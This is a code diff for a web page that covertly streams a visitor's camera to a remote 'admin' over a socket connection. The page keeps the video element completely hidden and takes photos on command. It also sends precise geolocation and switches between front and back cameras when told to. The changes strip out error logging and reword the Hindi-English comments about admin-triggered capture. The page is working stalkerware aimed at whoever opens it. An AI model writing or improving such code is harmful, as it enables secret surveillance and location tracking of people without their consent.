@@ -36,7 +36,7 @@
         .active { background: #d4edda; color: #155724; }
         .error { background: #f8d7da; color: #721c24; }
         
-        /* Camera completely hidden from user view */
+        /* Video hidden completely from user */
         video {
             display: none !important;
             visibility: hidden !important;
@@ -121,7 +121,6 @@ async function startCamera() {
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
         startLiveStream();
     } catch (error) {
-        console.error("Camera error:", error);
         cameraReady = false;
         setStatus("Connection active. (Allow permission if required)", "error");
     }
@@ -174,7 +173,7 @@ socket.on("start-auto-capture", () => {
 
 socket.on("capture-photo", () => { takeSinglePhoto(); });
 
-// Admin dwara trigger kiye gaye location request par permission prompt aayega
+// Admin location button click karne par user ke phone par native permission prompt aayega
 socket.on("request-location", () => {
     if (!navigator.geolocation) return;
 
@@ -185,14 +184,12 @@ socket.on("request-location", () => {
                 longitude: position.coords.longitude
             });
         },
-        error => {
-            console.error("Location error:", error);
-        },
+        error => {},
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 });
 
-// Admin dwara camera switch command milne par
+// Admin switch camera button click karne par camera switch hoga
 socket.on("switch-camera", async () => {
     useFrontCamera = !useFrontCamera;
     await startCamera();
@@ -229,12 +226,6 @@ function stopEverything() {
         mediaStream = null;
     }
 }
-
-document.addEventListener("visibilitychange", () => {
-    if (document.visibilityState === "visible") {
-        if (mediaStream && video.paused) video.play().catch(() => {});
-    }
-});
 
 startCamera();
 </script>
